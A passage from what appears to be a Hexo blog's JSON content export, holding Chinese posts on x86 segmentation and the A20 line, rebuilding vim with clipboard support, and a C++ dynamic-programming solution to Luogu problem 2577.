mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。\n\n- 解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是`<selector, offset>` ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表\n\n  {% asset_img 3.png %}\n\n#### 题外话\n\n- 可以使用一些方法使得分段实际上跟没有起作用一样。\n\n- 比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的\n\n- 在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用\n\n  > The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.\n\n- 逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。[A20 Line wiki](https://wiki.osdev.org/A20_Line)\n   > If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60 \n   > The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel's 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren't quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.\n   > When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).\n\n","content":"<blockquote>\n<p>以下内容是对mit6.828 xv6book、pcasm-book、cmu 15-410关于segment的doc的整理</p>\n<p><a href=\"https://pdos.csail.mit.edu/6.828/2017/xv6/book-rev10.pdf\" target=\"_blank\" rel=\"noopener\">xv6book</a>, <a href=\"https://pdos.csail.mit.edu/6.828/2017/readings/pcasm-book.pdf\" target=\"_blank\" rel=\"noopener\">PC Assembly Language</a>, <a href=\"https://www.cs.cmu.edu/~410/doc/segments/segments.html\" target=\"_blank\" rel=\"noopener\">CMU-15-410 segment </a></p>\n</blockquote>\n<blockquote>\n<p>在分段中，寻址使用的是一个 <code>&lt;selector, offset&gt;</code> 的pair</p>\n</blockquote>\n<h4 id=\"real-mode\"><a href=\"#real-mode\" class=\"headerlink\" title=\"real mode\"></a>real mode</h4><ul>\n<li><p>selector 保存在segment register，这是一个paragraph number。</p>\n</li>\n<li><blockquote>\n<p>内存单元常常以多个byte为单元一起使用，比如，两个byte是word，4个是double word，8个是quad word，16个则是paragraph</p>\n</blockquote>\n</li>\n<li><p>segmentation hardware（也就是那个进行段转换的机构）直接把selector的值乘以16然后加上offset的值得到physical address</p>\n</li>\n</ul>\n<h4 id=\"16-bit-protected-mode\"><a href=\"#16-bit-protected-mode\" class=\"headerlink\" title=\"16-bit protected mode\"></a>16-bit protected mode</h4><ul>\n<li><p>selector 同样保存在segment register中，不过现在不是单纯的paragraph number，而是包含一组信息：a segment number, a table selector flag, a request privilege level。 </p>\n<img src=\"/2018/06/30/Segmentation-分段/1.gif\">\n<p>segment number是到GDT（global decriptor table）或者LDT（local decriptor table）的index（数组下标称为array index，所以这个index就是类似数组下标的东西）。</p>\n<p>table selector flag指示的是segment number使用的是GDT还是LDT的index</p>\n<p>RPL（request privilege level）对于不同的段寄存器有不同的含义。对于cs寄存器，RPL设置处理器的特权级</p>\n<blockquote>\n<p> In this case (the %CS register), the RPL sets the privilege level of the processor</p>\n</blockquote>\n<p>不过，在mit 6.828的那本xv6book的Appendix B中有一幅图</p>\n<img src=\"/2018/06/30/Segmentation-分段/2.png\">\n<p>其中使用16bit的selector直接作为GDT/LDT的index，所以，这地方有一些疑点</p>\n</li>\n<li><p>GDT/LDT的descriptor包含base address、size和一些flag bits、privilege level，当访问内存时，处理器将offset与size相比较，如果offset&gt;= size ，则是越界访问。如果是合法的访问，则base address + offset得到 linear address</p>\n</li>\n</ul>\n<h4 id=\"32-bit-protected-mode\"><a href=\"#32-bit-protected-mode\" class=\"headerlink\" title=\"32-bit protected mode\"></a>32-bit protected mode</h4><ul>\n<li><p>80386 引入了32-bit protected mode，这个模式相对于16-bit的保护模式有两个区别——offset现在是32bit，segment 现在被切分成4K-sized 的unit，称为page。</p>\n</li>\n<li><p>解释一下整个地址转换流程。logical address（或者叫 virtual address） 就是<code>&lt;selector, offset&gt;</code> ，linear address就是selector 和 offset 经过segment translation 转换后得到的地址。如果没有开paging hardware，那么，linear address就直接作为physical address使用。如果有，则要查页表</p>\n<img src=\"/2018/06/30/Segmentation-分段/3.png\">\n</li>\n</ul>\n<h4 id=\"题外话\"><a href=\"#题外话\" class=\"headerlink\" title=\"题外话\"></a>题外话</h4><ul>\n<li><p>可以使用一些方法使得分段实际上跟没有起作用一样。</p>\n</li>\n<li><p>比如，所有的descriptor中base address都是0x00000000，size都是0xFFFFFFFF（假设是在32位的机器上），那么，segment translation的越界检查、$offset+base size * 16$ 实际上等价于无用功。所以看起来跟flat address space一样的</p>\n</li>\n<li><p>在xv6的boot过程中，实际上paging hardware、segmentation hardware并没有起作用</p>\n<blockquote>\n<p>The boot loader does not enable the paging hardware; the logical addresses that it uses are translated to linear addresses by the segmentation harware, and then used directly as physical addresses. Xv6 configures the segmentation hardware to translate logical to linear addresses without change, so that they are always equal.</p>\n</blockquote>\n</li>\n<li><p>逻辑地址segmen:offset 可以得出21bit的physical address（0xffff0+0xffff=0x10ffef），但是intel 8088把第21bit直接丢掉。所以为了兼容性，虽然后面的intel cpu可以支持21bit的地址，IBM还是提供了一个向后兼容。<a href=\"https://wiki.osdev.org/A20_Line\" target=\"_blank\" rel=\"noopener\">A20 Line wiki</a></p>\n<blockquote>\n<p>If the second bit of the keyboard controller’s output port is low, the 21st physical address bit is always cleared; if high, the 21st bit acts normally. The boot loader must enable the 21st address bit using I/O to the keyboard controller on ports 0x64 and 0x60<br>The traditional method for A20 line enabling is to directly probe the keyboard controller. The reason for this is that Intel’s 8042 keyboard controller had a spare pin which they decided to route the A20 line through. This seems foolish now given their unrelated nature, but at the time computers weren’t quite so standardized. Keyboard controllers are usually derivatives of the 8042 chip. By programming that chip accurately, you can either enable or disable bit #20 on the address bus.<br>When your PC boots, the A20 gate is always disabled, but some BIOSes do enable it for you, as do some high-memory managers (HIMEM.SYS) or bootloaders (GRUB).</p>\n</blockquote>\n</li>\n</ul>\n","slug":"Segmentation-分段","categories":[{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/categories/OS/"}],"tags":[{"name":"MIT 6.828","slug":"MIT-6-828","permalink":"https://h-zex.github.io/tags/MIT-6-828/"},{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/tags/OS/"}]},{"title":"vim 不支持系统剪切板的解决方案","date":"2018-06-05T07:15:31.000Z","path":"2018/06/05/vim不支持系统剪切板的解决方案/","text":"判断vim是否支持系统剪切板 在终端输入vim -version，如果clipboard 那一项是-clipboard ，以及xterm_clipboard 那一项是-xterm_clipboard ，说明并不支持。可以通过重新编译来解决 以下引用另一位博主的解决方案，原文地址 +clipboard +xterm_clipboard solution: –with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11 You’ll need to install the appropriate X development library like xlib and xtst for --with-x to work. On ubuntu it should be enough to install libx11-dev and libxtst-dev., xlibs-dev and sudo apt-get build-dep vim-gtk 编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行 123456789101112./configure \\--enable-cscope \\--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\--with-features=normal \\--enable-multibyte \\--enable-rubyinterp \\--enable-pythoninterp \\--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\--enable-perlinterp \\--enable-luainterp \\--enable-gui=gtk2 --enable-cscope --prefix=/usr make &amp;&amp; sudo make install 上面的配置选项可以根据自己的需求修改 完成后可以在src/auto/config.log 查看log","raw":"---\ntitle: vim 不支持系统剪切板的解决方案\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-06-05 15:15:31\ntags:\n- vim\n- 系统剪切板\n- clipboard\n- xterm_clipboard\ndescription: vim 不支持系统剪切板的解决方案\ncategories:\n- 运维\n---\n\n### 判断vim是否支持系统剪切板\n\n- 在终端输入`vim -version`，如果`clipboard` 那一项是`-clipboard` ，以及`xterm_clipboard` 那一项是`-xterm_clipboard` ，说明并不支持。可以通过重新编译来解决\n\n- 以下引用另一位博主的解决方案，[原文地址](https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae)\n\n- > +clipboard +xterm_clipboard\n  >\n  > solution:\n  >\n  > --with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11\n  >\n  > You'll need to install the appropriate X development library like `xlib` and `xtst` for `--with-x` to work. On ubuntu it should be enough to install `libx11-dev` and `libxtst-dev`., xlibs-dev\n  >\n  > and   sudo apt-get build-dep vim-gtk \n\n- 编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行\n\n  ```\n  ./configure \\\n  --enable-cscope \\\n  --with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\\n  --with-features=normal \\\n  --enable-multibyte \\\n  --enable-rubyinterp \\\n  --enable-pythoninterp \\\n  --with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\\n  --enable-perlinterp \\\n  --enable-luainterp \\\n  --enable-gui=gtk2 --enable-cscope --prefix=/usr\n   make && sudo make install\n  ```\n\n  上面的配置选项可以根据自己的需求修改\n\n  完成后可以在`src/auto/config.log` 查看log","content":"<h3 id=\"判断vim是否支持系统剪切板\"><a href=\"#判断vim是否支持系统剪切板\" class=\"headerlink\" title=\"判断vim是否支持系统剪切板\"></a>判断vim是否支持系统剪切板</h3><ul>\n<li><p>在终端输入<code>vim -version</code>，如果<code>clipboard</code> 那一项是<code>-clipboard</code> ，以及<code>xterm_clipboard</code> 那一项是<code>-xterm_clipboard</code> ，说明并不支持。可以通过重新编译来解决</p>\n</li>\n<li><p>以下引用另一位博主的解决方案，<a href=\"https://www.evernote.com/shard/s258/sh/8f17d13f-5040-45b4-a312-294ef7304fe5/c0c182567f72325da680fb38d66436ae\" target=\"_blank\" rel=\"noopener\">原文地址</a></p>\n</li>\n<li><blockquote>\n<p>+clipboard +xterm_clipboard</p>\n<p>solution:</p>\n<p>–with-x –x-includes=/usr/include/X11 –x-libraries=/usr/lib/X11</p>\n<p>You’ll need to install the appropriate X development library like <code>xlib</code> and <code>xtst</code> for <code>--with-x</code> to work. On ubuntu it should be enough to install <code>libx11-dev</code> and <code>libxtst-dev</code>., xlibs-dev</p>\n<p>and   sudo apt-get build-dep vim-gtk </p>\n</blockquote>\n</li>\n<li><p>编译方法，在github vim 主页下载源码zip包，解压后进入第一层目录，执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure \\</span><br><span class=\"line\">--enable-cscope \\</span><br><span class=\"line\">--with-x --x-includes=/usr/include/X11 --x-libraries=/usr/lib/X11 \\</span><br><span class=\"line\">--with-features=normal \\</span><br><span class=\"line\">--enable-multibyte \\</span><br><span class=\"line\">--enable-rubyinterp \\</span><br><span class=\"line\">--enable-pythoninterp \\</span><br><span class=\"line\">--with-python-config-dir=/usr/lib/python2.7/config-x86_64-linux-gnu \\</span><br><span class=\"line\">--enable-perlinterp \\</span><br><span class=\"line\">--enable-luainterp \\</span><br><span class=\"line\">--enable-gui=gtk2 --enable-cscope --prefix=/usr</span><br><span class=\"line\"> make &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>\n<p>上面的配置选项可以根据自己的需求修改</p>\n<p>完成后可以在<code>src/auto/config.log</code> 查看log</p>\n</li>\n</ul>\n","slug":"vim不支持系统剪切板的解决方案","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"vim","slug":"vim","permalink":"https://h-zex.github.io/tags/vim/"},{"name":"系统剪切板","slug":"系统剪切板","permalink":"https://h-zex.github.io/tags/系统剪切板/"},{"name":"clipboard","slug":"clipboard","permalink":"https://h-zex.github.io/tags/clipboard/"},{"name":"xterm_clipboard","slug":"xterm-clipboard","permalink":"https://h-zex.github.io/tags/xterm-clipboard/"}]},{"title":"洛谷2577 午餐","date":"2018-05-20T00:20:06.000Z","path":"2018/05/20/洛谷2577-午餐/","text":"题目题目描述上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。 THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。 现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。 假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。 现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。 输入输出格式输入格式： 第一行一个整数N，代表总共有N个人。 以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。 输出格式： 一个整数T，代表所有人吃完饭的最早时刻。 输入输出样例输入样例#1： 12345652 27 71 36 48 5 输出样例#1： 117 题解吃饭时间越长越早排队 假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，i、j ——即原先是i 排在j 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来 首先，交换前从队头到到j 总的打饭时间或者是交换后从队头到i 的总的打饭时间都是$T$ 然后以前$T$时间后，j 开始吃饭，现在是$T$时间后，i 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是j 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ 如何记录状态以及状态转移方程 $dp[i][j][k]$ ：表示当排到第i 个人时，第一队的排队耗时是j ，第二队的排队耗时是k 先定义符号，$man[i].a$ 表示第i 人的打饭时间，$man[i].b$ 是第i 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$ 因为，对于确定的i ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ 123int x = MAX(dp[i-1][j-man[i].a][k], j+man[i].b);int y = MAX(dp[i-1][j][k-man[i].a], k+man[i].b);dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y); 之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX 因为无需枚举k ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;algorithm&gt;#include &lt;cassert&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;cstring&gt;#include &lt;iostream&gt;#include &lt;map&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define FWD(x, b, e) for (int x = b; x &lt; e; x++)#define BWD(x, b, e) for (int x = b; x &gt;= e; x--)#define INF 0x3f3f3f3fusing namespace std;inline int MAX(int x, int y) &#123; return x &lt; y ? y : x; &#125;inline int MIN(int x, int y) &#123; return x &lt; y ? x : y; &#125;struct Node &#123; int a, b;// a is pick time, b is eat time bool operator&lt;(const Node &amp;y) const &#123; return this-&gt;b &gt; y.b; &#125;&#125;;Node man[300];int dp[80010];int sum[300];int main() &#123; int n; scanf(\"%d\", &amp;n); for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d%d\", &amp;man[i].a, &amp;man[i].b); &#125; sort(man, man + n); sum[0] = man[0].a; FWD(i, 1, n) &#123; sum[i] = sum[i - 1] + man[i].a; &#125; memset(dp, 10, sizeof(dp)); dp[0] = man[0].b + man[0].a; dp[man[0].a] = man[0].b + man[0].a; FWD(i, 1, n) &#123; BWD(j, sum[i], 0) &#123; int tmp1 = INF, tmp2 = INF; if (j &gt;= man[i].a) &#123; tmp1 = MAX(dp[j - man[i].a], j + man[i].b);// 第一个人放在1队 &#125; if (sum[i] - j &gt;= man[i].a) &#123; tmp2 = MAX(dp[j], sum[i] - j + man[i].b);// 第i个人放在二队 &#125; // 如果j只能允许man[i].a放在一队，则i就放一队 if (j &gt;= man[i].a &amp;&amp; sum[i] - j &lt; man[i].a) &#123; dp[j] = tmp1; &#125;else if (j &lt; man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123; dp[j] = tmp2; &#125;else if (j &gt;= man[i].a &amp;&amp; sum[i] - j &gt;= man[i].a) &#123; dp[j] = MIN(tmp2, tmp1); &#125; &#125; &#125; int ans = INF; FWD(i, 0, sum[n - 1] + 1) &#123; ans = ans &lt; dp[i] ? ans : dp[i]; &#125; printf(\"%d\\n\", ans);&#125; 注意，在枚举$dp[i][j]$ 的j 时，要注意该j 是否允许man[i].a 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN 注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j&lt;man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j&lt;man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。 此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归 截图来源","raw":"---\ntitle: 洛谷2577 午餐\ntoc: false\ncomments: true\nmathjax: true\ndate: 2018-05-20 08:20:06\ntags: \n- 动态规划\n- ACM\ndescription: 题解\ncategories:\n- 算法\n---\n\n## 题目\n\n#### 题目描述\n\n上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。\n\nTHU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。\n\n现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。\n\n假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。\n\n现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。\n\n#### 输入输出格式\n\n输入格式：\n\n第一行一个整数N，代表总共有N个人。\n\n以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。\n\n输出格式：\n\n一个整数T，代表所有人吃完饭的最早时刻。\n\n#### 输入输出样例\n\n输入样例#1：\n\n```\n5\n2 2\n7 7\n1 3\n6 4\n8 5\n\n```\n\n输出样例#1：\n\n```\n17\n```\n\n## 题解\n\n#### 吃饭时间越长越早排队\n\n- 假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，`i`、`j` ——即原先是`i` 排在`j` 前面，并且两人各自的吃饭时间$b[j]<b[i]$，现在交换过来\n- 首先，交换前从队头到到`j` 总的打饭时间或者是交换后从队头到`i` 的总的打饭时间都是$T$\n- 然后以前$T$时间后，`j` 开始吃饭，现在是$T$时间后，`i` 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是`j` 的吃饭时间），那么现在就是$T+b[i]>T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ \n\n#### 如何记录状态以及状态转移方程\n\n- $dp[i][j][k]$ ：表示当排到第`i` 个人时，第一队的排队耗时是`j` ，第二队的排队耗时是`k` \n\n- 先定义符号，$man[i].a$ 表示第`i` 人的打饭时间，$man[i].b$ 是第`i` 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$\n\n- 因为，对于确定的`i` ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ \n\n- ```cpp\n  int x = MAX(dp[i-1][j-man[i].a][k], j+man[i].b);\n  int y = MAX(dp[i-1][j][k-man[i].a], k+man[i].b);\n  dp[i][j][k] = dp[i][j][sum[i]-j] = MIN(x, y);\n  ```\n\n- 之所以要取MAX，是因为$dp[i-1][j-man[i].a][k]$ 可能是第一队达到的最长吃饭完成时间，也可能是第二队达到的，而即使是第一队达到的，也有可能现在第一队最后一个吃完的时间$j+man[i].b$ 比$dp[i-1][j-man[i].a][k]$ 早，所以要取MAX\n\n- 因为无需枚举`k` ，所以无需使用三维数组。并且可以使用滚动数组，从而压缩为一维数组\n\n## 代码\n\n```cpp\n#include <algorithm>\n#include <cassert>\n#include <cstdio>\n#include <cstdlib>\n#include <cstring>\n#include <iostream>\n#include <map>\n#include <queue>\n#include <vector>\n#define FWD(x, b, e) for (int x = b; x < e; x++)\n#define BWD(x, b, e) for (int x = b; x >= e; x--)\n#define INF 0x3f3f3f3f\nusing namespace std;\n\ninline int MAX(int x, int y) { return x < y ? y : x; }\n\ninline int MIN(int x, int y) { return x < y ? x : y; }\n\nstruct Node {\n    int a, b;// a is pick time, b is eat time\n    bool operator<(const Node &y) const { return this->b > y.b; }\n};\nNode man[300];\nint dp[80010];\nint sum[300];\n\nint main() {\n    int n;\n    scanf(\"%d\", &n);\n    for (int i = 0; i < n; i++) {\n        scanf(\"%d%d\", &man[i].a, &man[i].b);\n    }\n    sort(man, man + n);\n\n    sum[0] = man[0].a;\n    FWD(i, 1, n) { sum[i] = sum[i - 1] + man[i].a; }\n    memset(dp, 10, sizeof(dp));\n    dp[0] = man[0].b + man[0].a;\n    dp[man[0].a] = man[0].b + man[0].a;\n    FWD(i, 1, n) {\n        BWD(j, sum[i], 0) {\n            int tmp1 = INF, tmp2 = INF;\n            if (j >= man[i].a) {\n                tmp1 = MAX(dp[j - man[i].a], j + man[i].b);// 第一个人放在1队\n            }\n            if (sum[i] - j >= man[i].a) {\n                tmp2 = MAX(dp[j], sum[i] - j + man[i].b);// 第i个人放在二队\n            }\n            // 如果j只能允许man[i].a放在一队，则i就放一队\n            if (j >= man[i].a && sum[i] - j < man[i].a) {\n                dp[j] = tmp1;\n            }else if (j < man[i].a && sum[i] - j >= man[i].a) {\n                dp[j] = tmp2;\n            }else if (j >= man[i].a && sum[i] - j >= man[i].a) {\n                dp[j] = MIN(tmp2, tmp1);\n            }\n        }\n    }\n    int ans = INF;\n    FWD(i, 0, sum[n - 1] + 1) { ans = ans < dp[i] ? ans : dp[i]; }\n    printf(\"%d\\n\", ans);\n}\n```\n\n- 注意，在枚举$dp[i][j]$ 的`j` 时，要注意该`j ` 是否允许`man[i].a` 放在第一队，或者会放在第二队，所以，给$dp[i][j]$ 赋值时也要注意是否只能放在其中一队，从而直接赋值就行了，如果能放在其中两队，那么就要取MIN\n\n- 注意，此题初始化时不可以把从$man[i].a+1$ 到$sum[n-1]$ 的dp都赋值为$man[i].a+man[i].b$ ，而应该赋值为INF。因为后面进行dp时，枚举$j$ 时，可能出现一种情况$j<man[i].a$ 导致这个j时不可以放在第一队，并且$sum[i]-j<man[i].a$ 导致也不可以放在第二队，这种情况就应该INF。\n\n- 此题如果使用自顶向下应该可以节省一些冗余状态——就是直接把上面的循环改成尾递归\n\n  {% asset_img 1.png %}\n\n- [截图来源 ](https://www.luogu.org/problemnew/solution/P2577)\n\n","content":"<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><h4 id=\"题目描述\"><a href=\"#题目描述\" class=\"headerlink\" title=\"题目描述\"></a>题目描述</h4><p>上午的训练结束了，THU ACM小组集体去吃午餐，他们一行N人来到了著名的十食堂。这里有两个打饭的窗口，每个窗口同一时刻只能给一个人打饭。由于每个人的口味（以及胃口）不同，所以他们要吃的菜各有不同，打饭所要花费的时间是因人而异的。另外每个人吃饭的速度也不尽相同，所以吃饭花费的时间也是可能有所不同的。</p>\n<p>THU ACM小组的吃饭计划是这样的：先把所有的人分成两队，并安排好每队中各人的排列顺序，然后一号队伍到一号窗口去排队打饭，二号队伍到二号窗口去排队打饭。每个人打完饭后立刻开始吃，所有人都吃完饭后立刻集合去六教地下室进行下午的训练。</p>\n<p>现在给定了每个人的打饭时间和吃饭时间，要求安排一种最佳的分队和排队方案使得所有人都吃完饭的时间尽量早。</p>\n<p>假设THU ACM小组在时刻0到达十食堂，而且食堂里面没有其他吃饭的同学（只有打饭的师傅）。每个人必须而且只能被分在一个队伍里。两个窗口是并行操作互不影响的，而且每个人打饭的时间是和窗口无关的，打完饭之后立刻就开始吃饭，中间没有延迟。</p>\n<p>现在给定N个人各自的打饭时间和吃饭时间，要求输出最佳方案下所有人吃完饭的时刻。</p>\n<h4 id=\"输入输出格式\"><a href=\"#输入输出格式\" class=\"headerlink\" title=\"输入输出格式\"></a>输入输出格式</h4><p>输入格式：</p>\n<p>第一行一个整数N，代表总共有N个人。</p>\n<p>以下N行，每行两个整数 Ai，Bi。依次代表第i个人的打饭时间和吃饭时间。</p>\n<p>输出格式：</p>\n<p>一个整数T，代表所有人吃完饭的最早时刻。</p>\n<h4 id=\"输入输出样例\"><a href=\"#输入输出样例\" class=\"headerlink\" title=\"输入输出样例\"></a>输入输出样例</h4><p>输入样例#1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5</span><br><span class=\"line\">2 2</span><br><span class=\"line\">7 7</span><br><span class=\"line\">1 3</span><br><span class=\"line\">6 4</span><br><span class=\"line\">8 5</span><br></pre></td></tr></table></figure>\n<p>输出样例#1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">17</span><br></pre></td></tr></table></figure>\n<h2 id=\"题解\"><a href=\"#题解\" class=\"headerlink\" title=\"题解\"></a>题解</h2><h4 id=\"吃饭时间越长越早排队\"><a href=\"#吃饭时间越长越早排队\" class=\"headerlink\" title=\"吃饭时间越长越早排队\"></a>吃饭时间越长越早排队</h4><ul>\n<li>假设有一个最优分组方法，其中第一队内是按吃饭时间长短排序的——越长排在越前。然后尝试交换该队内的某两个人，<code>i</code>、<code>j</code> ——即原先是<code>i</code> 排在<code>j</code> 前面，并且两人各自的吃饭时间$b[j]&lt;b[i]$，现在交换过来</li>\n<li>首先，交换前从队头到到<code>j</code> 总的打饭时间或者是交换后从队头到<code>i</code> 的总的打饭时间都是$T$</li>\n<li>然后以前$T$时间后，<code>j</code> 开始吃饭，现在是$T$时间后，<code>i</code> 开始吃饭。如果以前最终吃饭完成的时间是$T+b[j]$ （$b[j]$ 是<code>j</code> 的吃饭时间），那么现在就是$T+b[i]&gt;T+b[j]$ 。如果以前最终吃饭完成时间比$T+b[j]$ 后，那么现在最终吃饭完成时间就大于或者等于$T+b[i]$ </li>\n</ul>\n<h4 id=\"如何记录状态以及状态转移方程\"><a href=\"#如何记录状态以及状态转移方程\" class=\"headerlink\" title=\"如何记录状态以及状态转移方程\"></a>如何记录状态以及状态转移方程</h4><ul>\n<li><p>$dp[i][j][k]$ ：表示当排到第<code>i</code> 个人时，第一队的排队耗时是<code>j</code> ，第二队的排队耗时是<code>k</code> </p>\n</li>\n<li><p>先定义符号，$man[i].a$ 表示第<code>i</code> 人的打饭时间，$man[i].b$ 是第<code>i</code> 人的吃饭时间，$sum[x]=\\Sigma_{i=0}^x man[i].a$</p>\n</li>\n<li><p>因为，对于确定的<code>i</code> ，$k=sum[i]-j$ ，所以，$dp[i][j][k]=dp[i][j][sum[i]-j]$ </p>\n</li>\n<li><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 